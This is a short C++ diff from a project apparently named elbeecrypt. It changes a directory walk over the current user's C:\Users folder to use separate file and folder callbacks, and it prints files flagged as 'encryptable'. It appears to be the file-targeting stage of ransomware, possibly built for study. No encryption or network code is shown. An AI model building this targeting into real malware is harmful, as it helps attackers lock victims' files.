@@ -44,15 +44,19 @@ int main(int argc, char **argv){
 	std::cout << "Sodium: " << sodium_init() << std::endl;
 
 	//Define the lambda to collect the directory listings
-	auto consumer = [](const fs::path& path){
+	auto fileConsumer = [](const fs::path& path){
 		if(elbeecrypt::common::targets::Extensions::isEncryptable(path)){
 			std::cout << "Found encryptable file at " << path << std::endl;
 		}
 	};
 
+	auto folderConsumer = [](const fs::path& path){
+		return true;
+	};
+
 	//Call the walk function with the root path and the lambda
 	std::string uname(getenv("username"));
-	elbeecrypt::common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), consumer);
+	elbeecrypt::common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), fileConsumer, folderConsumer);
 
 	vector<fs::path> paths = {};
 
